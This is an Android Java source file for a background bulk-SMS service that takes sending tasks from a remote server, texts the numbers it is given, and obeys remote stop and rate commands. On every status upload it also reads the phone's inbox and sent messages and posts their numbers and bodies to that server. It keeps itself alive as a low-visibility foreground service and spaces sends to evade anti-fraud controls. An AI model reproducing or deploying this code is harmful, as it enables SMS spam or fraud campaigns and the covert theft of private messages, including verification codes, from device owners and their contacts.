package com.fcai.smsapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * 后台群发服务 v102：
 * - 循环 领任务 -> 发短信 -> 回报（不变）
 * - 远程控制：claim 返回 ctrl {stop, interval}，stop=暂停本轮，interval=覆盖本地间隔
 * - 每轮上报 upload：电量/网络 + 最近日志 + 新读到的收发短信（READ_SMS，10 秒一次）
 */
public class SendService extends Service {

    private static final String SERVER = "https://6109.cn.mt/api/smsq";
    private static final String CHAN = "sms_service";
    private static final int NOTI = 1001;
    private static volatile boolean running = false;
    private static long lastStartAt = 0;  // 本次服务启动时间
    private static volatile long lastOkAt = 0;    // 最近一次网络成功
    private static volatile long lastErrAt = 0;   // 最近一次网络错误
    private Thread worker;
    private Handler mainHandler;
    private SharedPreferences sp;
    private long smsScanFrom = 0;      // 已扫描到的短信时间戳（只扫增量）

    public static boolean isRunning() { return running; }
    public static long lastStartAt() { return lastStartAt; }

    /** 网络是否中断: 最近有错误且错误比成功新, 且超过 30 秒没恢复 */
    public static boolean netBroken() {
        return lastErrAt > lastOkAt && (System.currentTimeMillis() - lastErrAt > 30000);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sp = getSharedPreferences("sms", MODE_PRIVATE);
        mainHandler = new Handler(Looper.getMainLooper());
        smsScanFrom = sp.getLong("sms_scan_from", 0);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            lastStartAt = System.currentTimeMillis();
            toast("群发服务已启动");
        }
        startFg();
        if (worker == null || !worker.isAlive()) {
            worker = new Thread(this::loop);
            worker.start();
        }
        return START_STICKY;
    }

    /** 常驻通知(前台服务), 系统不敢杀 */
    private void startFg() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        Notification.Builder nb;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHAN, "群发服务",
                    NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(ch);
            nb = new Notification.Builder(this, CHAN);
        } else {
            nb = new Notification.Builder(this);
        }
        Notification n = nb.setSmallIcon(android.R.drawable.stat_notify_chat)
                .setContentTitle("短信群发服务运行中")
                .setContentText("正在自动领取并发送任务")
                .setOngoing(true)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTI, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTI, n);
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        lastErrAt = 0;
        lastOkAt = 0;
        if (worker != null) worker.interrupt();
        toast("群发服务已停止");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void toast(String msg) {
        mainHandler.post(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
    }

    private void appendLog(String line) {
        String old = sp.getString("log", "");
        String nl = System.currentTimeMillis() / 1000 + "  " + line;
        sp.edit().putString("log", (nl + "\n" + old).split("\n").length > 60
                ? String.join("\n", java.util.Arrays.copyOf((nl + "\n" + old).split("\n"), 60))
                : nl + "\n" + old).apply();
    }

    private void loop() {
        String devId = sp.getString("deviceId", "unknown");
        boolean ctrlStop = false;
        int ctrlInterval = 0;
        while (running) {
            try {
                register(devId);
                // 远程停发：跳过领任务，但仍上报状态，每 10 秒重新查
                if (ctrlStop) {
                    uploadStatus(devId, ctrlStop, ctrlInterval);
                    sleep(10000);
                    continue;
                }
                JSONObject claim = httpPost("/claim", new JSONObject().put("deviceId", devId));
                lastOkAt = System.currentTimeMillis();
                // 读远程控制指令（远程停发/远程调速）
                ctrlStop = false;
                ctrlInterval = 0;
                JSONObject ctrl = claim.optJSONObject("ctrl");
                if (ctrl != null) {
                    ctrlStop = ctrl.optBoolean("stop", false);
                    ctrlInterval = ctrl.optInt("interval", 0);
                }
                if (ctrlStop) {
                    appendLog("收到远程停发指令，本轮暂停");
                    uploadStatus(devId, true, ctrlInterval);
                    sleep(10000);
                    continue;
                }
                if (!claim.optBoolean("success")) { sleep(5000); continue; }
                JSONObject task = claim.optJSONObject("task");
                if (task == null) {
                    // 无任务：照常上报一次，5 秒后再查
                    uploadStatus(devId, false, ctrlInterval);
                    sleep(5000);
                    continue;
                }

                int id = task.getInt("id");
                String phone = task.getString("phone");
                String text = task.getString("text");
                appendLog("领到 #" + id + " -> " + phone);

                boolean ok = sendSms(phone, text);
                httpPost("/report", new JSONObject().put("taskId", id).put("ok", ok)
                        .put("result", ok ? "" : "send failed"));

                int sent = sp.getInt("sent", 0), fail = sp.getInt("fail", 0);
                if (ok) { sp.edit().putInt("sent", sent + 1).apply(); appendLog("✅ 已发送 #" + id); }
                else { sp.edit().putInt("fail", fail + 1).apply(); appendLog("❌ 发送失败 #" + id); }

                // 间隔：远程调速优先（0=未设则用本地），发完上报一次
                int iv = ctrlInterval > 0 ? ctrlInterval : sp.getInt("interval", 10);
                if (ctrlInterval > 0) appendLog("远程调速：间隔 " + iv + " 秒");
                uploadStatus(devId, false, ctrlInterval);
                sleep(iv * 1000L);  // 防风控间隔
            } catch (Exception e) {
                lastErrAt = System.currentTimeMillis();
                appendLog("错误: " + e.getMessage());
                sleep(5000);
            }
        }
    }

    /** 上报电量/网络/最近日志 + 增量读到的收发短信（10 秒一次） */
    private void uploadStatus(String devId, boolean remoteStop, int remoteInterval) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", devId);
            body.put("battery", batteryLevel());
            body.put("net", networkType());
            body.put("stop", remoteStop);
            body.put("interval", remoteInterval > 0 ? remoteInterval : sp.getInt("interval", 10));
            // 最近日志（最新 10 行）
            JSONArray logs = new JSONArray();
            String[] logLines = sp.getString("log", "").split("\n");
            for (int i = 0; i < Math.min(10, logLines.length); i++) {
                if (logLines[i].trim().isEmpty()) continue;
                int sp = logLines[i].indexOf(' ');
                long ts = 0;
                if (sp > 0) {
                    try { ts = Long.parseLong(logLines[i].substring(0, sp)); } catch (Exception ignored) {}
                }
                JSONObject l = new JSONObject();
                l.put("ts", ts > 0 ? ts : System.currentTimeMillis() / 1000);
                l.put("msg", logLines[i].length() > 120 ? logLines[i].substring(0, 120) : logLines[i]);
                logs.put(l);
            }
            body.put("logs", logs);
            // 增量扫收发短信（收件箱+已发送）
            JSONArray smsArr = new JSONArray();
            long nowSec = System.currentTimeMillis() / 1000;
            smsScanFrom = scanSms(smsArr, smsScanFrom > 0 ? smsScanFrom : nowSec - 30, nowSec);
            sp.edit().putLong("sms_scan_from", smsScanFrom).apply();
            body.put("sms", smsArr);
            httpPost("/upload", body);
        } catch (Exception e) {
            // 上报失败不影响主流程
        }
    }

    /** 扫描增量短信（dir=in 收件箱 / dir=sent 已发送），返回本次扫到的最大时间戳 */
    private long scanSms(JSONArray out, long fromSec, long toSec) {
        try {
            android.content.ContentResolver cr = getContentResolver();
            String[] cols = {Telephony.Sms.DATE, Telephony.Sms.NUMBER, Telephony.Sms.BODY, Telephony.Sms.DATE_RECEIVED};
            long maxTs = fromSec;
            maxTs = scanOneFolder(cr, out, Telephony.Sms.Inbox.CONTENT_URI, cols, maxTs, false);
            maxTs = scanOneFolder(cr, out, Telephony.Sms.Sent.CONTENT_URI, cols, maxTs, true);
            return maxTs;
        } catch (Exception ignored) {
            return fromSec;  // 没授权 READ_SMS 等：保持原水位，下次再试
        }
    }

    private long scanOneFolder(android.content.ContentResolver cr, JSONArray out,
                               android.net.Uri uri, String[] cols, long fromSec, boolean isSent) {
        long maxTs = fromSec;
        try {
            Cursor c = cr.query(uri, cols, null, null, Telephony.Sms.DATE + " DESC");
            if (c == null) return fromSec;
            int iDate = c.getColumnIndex(Telephony.Sms.DATE);
            int iNum = c.getColumnIndex(Telephony.Sms.NUMBER);
            int iBody = c.getColumnIndex(Telephony.Sms.BODY);
            int iRecv = c.getColumnIndex(Telephony.Sms.DATE_RECEIVED);
            int added = 0;
            while (c.moveToNext() && added < 20) {
                long ts = iDate >= 0 ? c.getLong(iDate) / 1000 : 0;
                if (ts <= fromSec) break;  // 已扫过
                if (iRecv >= 0 && !isSent && c.getLong(iRecv) > 0) ts = c.getLong(iRecv) / 1000;
                String phone = iNum >= 0 ? c.getString(iNum) : "";
                String body = iBody >= 0 ? c.getString(iBody) : "";
                if (body == null) body = "";
                JSONObject s = new JSONObject();
                s.put("ts", ts);
                s.put("dir", isSent ? "sent" : "in");
                s.put("phone", phone);
                s.put("text", body.length() > 300 ? body.substring(0, 300) : body);
                out.put(s);
                if (ts > maxTs) maxTs = ts;
                added++;
            }
            c.close();
        } catch (Exception ignored) { }
        return maxTs;
    }

    /** 电池百分比，-1 表示未知 */
    private int batteryLevel() {
        try {
            IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent b = registerReceiver(null, f);
            if (b == null) return -1;
            int scale = b.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            int level = b.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
            return level * 100 / Math.max(1, scale);
        } catch (Exception e) { return -1; }
    }

    /** 网络类型：wifi / 4g / 3g / 2g / off */
    private String networkType() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            NetworkInfo ni = cm == null ? null : cm.getActiveNetworkInfo();
            if (ni == null || !ni.isConnected()) return "off";
            switch (ni.getType()) {
                case ConnectivityManager.TYPE_WIFI: return "wifi";
                case ConnectivityManager.TYPE_MOBILE:
                    switch (ni.getSubtype()) {
                        case NetworkInfo.Subtype.LTE: return "4g";
                        case NetworkInfo.Subtype.HSDPA:
                        case NetworkInfo.Subtype.HSUPA:
                        case NetworkInfo.Subtype.HSOPA: return "3g";
                        default: return "2g";
                    }
                default: return "other";
            }
        } catch (Exception e) { return "unknown"; }
    }

    private boolean sendSms(String phone, String text) {
        try {
            SmsManager sm = SmsManager.getDefault();
            // 长短信自动拆分
            java.util.ArrayList<String> parts = sm.divideMessage(text);
            sm.sendMultipartTextMessage(phone, null, parts, null, null);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void register(String devId) throws Exception {
        httpPost("/register", new JSONObject().put("deviceId", devId)
                .put("name", devId).put("platform", "android"));
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { }
    }

    // 简易 HTTP POST (JSON in / JSON out)
    private JSONObject httpPost(String path, JSONObject body) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(SERVER + path).openConnection();
        conn.setRequestMethod("POST");
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(20000);
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/json");
        byte[] out = body.toString().getBytes("UTF-8");
        conn.setFixedLengthStreamingMode(out.length);
        OutputStream os = conn.getOutputStream();
        os.write(out);
        os.close();
        int code = conn.getResponseCode();
        BufferedReader br = new BufferedReader(new InputStreamReader(
                code >= 200 && code < 300 ? conn.getInputStream() : conn.getErrorStream(), "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();
        return new JSONObject(sb.length() > 0 ? sb.toString() : "{}");
    }
}
